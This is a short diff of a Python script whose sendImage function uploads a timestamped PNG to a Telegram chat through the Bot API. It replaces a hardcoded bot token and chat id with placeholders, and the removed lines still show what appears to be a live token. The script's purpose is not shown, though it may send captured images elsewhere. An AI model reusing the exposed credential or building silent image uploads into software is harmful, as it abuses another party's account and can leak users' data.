@@ -18,9 +18,9 @@ print("""\033[93m
  
 """.format(a="\033[92m", b="\033[94m"))
 def sendImage():
-    url = "https://api.telegram.org/bot1207025001:AAETpX1xSUqmlwM9Jysa0u61FzNYEXaMlA0/sendPhoto";
+    url = "https://api.telegram.org/bot<token>/sendPhoto";
     files = {'photo': open(str(new_folder)+'/'+str(dn)+'.png', 'rb')}
-    data = {'chat_id' : "-345181111"}
+    data = {'chat_id' : "chatid"}
     r= requests.post(url, files=files, data=data)
     #print(r.status_code, r.reason, r.content)
 d=datetime.now()
